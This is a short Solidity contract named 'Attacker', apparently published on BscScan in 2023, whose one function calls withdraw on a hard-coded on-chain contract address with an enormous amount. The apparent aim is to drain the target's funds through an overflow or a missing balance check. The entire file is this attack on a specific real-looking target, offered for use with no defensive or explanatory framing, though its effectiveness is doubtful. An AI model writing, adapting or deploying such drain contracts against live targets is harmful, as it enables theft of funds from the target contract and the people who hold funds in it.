/**
 *Submitted for verification at BscScan.com on 2023-05-08
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.19;

contract Attacker {
    function attack() public payable {
        address target = 0x6276dea68C8A9bB688813687605663E7a28eb48c; // Target contract address
        uint balance = 2**256-1; // Set balance to a very large value
        target.call{value: msg.value}(abi.encodeWithSignature("withdraw(uint256)", balance-1)); // Call the withdraw function with a very large value (2^256-2)
    }
}